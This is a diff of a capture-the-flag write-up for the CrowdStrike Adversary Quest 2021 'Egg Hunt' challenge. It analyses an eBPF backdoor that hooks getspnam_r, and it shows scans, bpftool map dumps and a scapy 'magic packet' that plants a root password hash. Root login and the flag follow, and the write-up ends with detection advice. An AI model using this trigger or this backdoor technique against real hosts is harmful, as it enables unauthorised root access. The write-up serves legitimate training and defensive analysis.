@@ -1,22 +1,41 @@
-## Quest
-Egg Hunt
+# Crowdstrike Adversary Quest 2021 / Protective Penguin / #3 Egg Hunt
+
+## Challenge Description
 After moving laterally, PROTECTIVE PENGUIN compromised a number of additional systems and gained persistence. We have identified another host in the DMZ that we believe was backdoored by the adversary and is used to regain access.
 Please download a virtual machine image of that host and identify the backdoor. Validate your findings in our test environment on egghunt.challenges.adversary.zone.
 
 Hint:
 Snapshot is (at least) compatible with current QEMU versions available in Arch Linux and Fedora 33 (5.1.0, 5.2.0).
 
+## Pre-Requisites
+This challenge consists of a qcow2 image, that needs qemu to run. In case qemu isn't installed, yet, now is a good time to do so. ;-)
+```
+sudo apt install qemu-system-x86
+```
 
+qemu-img can be used to list snapshots of this image.
+```
+qemu-img snapshot -l art_ctf_injector_local.qcow2 
+Snapshot list:
+ID        TAG               VM SIZE                DATE     VM CLOCK     ICOUNT
+1         compromised       452 MiB 2021-01-13 20:15:55 00:02:17.632           
+```
 
-
-
-
-
+The run.sh script uses qemu-system-x86_64 to run the image.
+```
 ./run.sh 
 Restoring snapshot compromised (art_ctf_egghunt_local.qcow2)
 Press Return...
-qemu-system-x86_64: warning: TSC frequency mismatch between VM (2400004 kHz) and host (2903497 kHz), and TSC scaling unavailable
+```
 
+One of the options used for qemu inside run.sh is setting up port forwarding for the custom ports tcp/3322 and tcp/4321 from host to guest system.
+```
+hostfwd=tcp::4422-:4422,hostfwd=udp::1337-:1337
+```
+
+## Emurate Network Services with Listen Ports
+So, which network services might listen of the forwarded custom ports?
+```
 root@egghunt:~# netstat -pantu
 Active Internet connections (servers and established)
 Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
@@ -25,8 +44,7 @@ tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      
 tcp6       0      0 :::4422                 :::*                    LISTEN      379/sshd: /usr/sbin 
 udp        0      0 127.0.0.53:53           0.0.0.0:*                           365/systemd-resolve 
 udp        0      0 0.0.0.0:68              0.0.0.0:*                           587/dhclient 
-
-qemu setup does host-guest forwarding: hostfwd=tcp::4422-:4422,hostfwd=udp::1337-:1337
+```
 
 udp 1337 does not have a listen service in netstat?
 
@@ -42,6 +60,9 @@ PORT     STATE         SERVICE
 Nmap done: 1 IP address (1 host up) scanned in 2.14 seconds
 
 
+## Nmap Scan of Backdoored Target Server
+It would be interesting to verify if both of these custom ports are open on the target server as well.
+```
 sudo nmap -sU -p 1337,53,68 egghunt.challenges.adversary.zone 
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-24 20:00 CET
 Nmap scan report for egghunt.challenges.adversary.zone (144.76.211.234)
@@ -52,6 +73,7 @@ PORT     STATE         SERVICE
 53/udp   closed        domain
 68/udp   open|filtered dhcpc
 1337/udp closed        menandmice-dns
+```
 
 /var/log/syslog.1
 Jan 14 12:15:17 egghunt kernel: [   86.289920] cron[971] is installing a program with bpf_probe_write_user helper that may corrupt user memory!
@@ -608,6 +630,9 @@ root@egghunt:/proc/974/fd# bpftool -p map dump id 4
 ]
 
 
+## Now it's Flag Time!
+Send the magic packet to put hash for md5crypt password of **pass** into bpf backdoor.
+```
 >>> p = IP(dst="egghunt.challenges.adversary.zone")/UDP(dport=1337, len=0x2a)/Raw("fsf"+"\x35\x36\x37\x0c\x1b\x0b\x27\x00\x66\x00\x2d\x70\x7a\x04\x7a\x73\x70\x31\x71\x6d\x03\x2a\x1a\x15\x18\x15\x0b\x21\x31
 ...: \x2d\x6c")
 >>> p
@@ -615,9 +640,21 @@ root@egghunt:/proc/974/fd# bpftool -p map dump id 4
 >>> send(p)
 .
 Sent 1 packets.
+```
 
+Login with creds **root** / **pass**.
+```
 ssh -l root egghunt.challenges.adversary.zone
 root@egghunt.challenges.adversary.zone's password: 
 PTY allocation request failed on channel 0
 CS{ebpf_b4ckd00r_ftw}
 Connection to egghunt.challenges.adversary.zone closed.
+```
+
+Flag: **CS{ebpf_b4ckd00r_ftw}**
+
+## Conclusion
+This challenge has been another great learning experience, comprising different aspects of cyber security offense and defense.
+The backdoor is triggered through bpf bytecode, hooking the libc function getspnam_r and listening for magic packets to replace password hashes in-memory.
+There is no extra listen port, no seperate backdoor process running.
+Detection can be achieved by monitoring critical system log entries and weird file descriptor changes to processes. That, and using bpftool to check for anomalies.
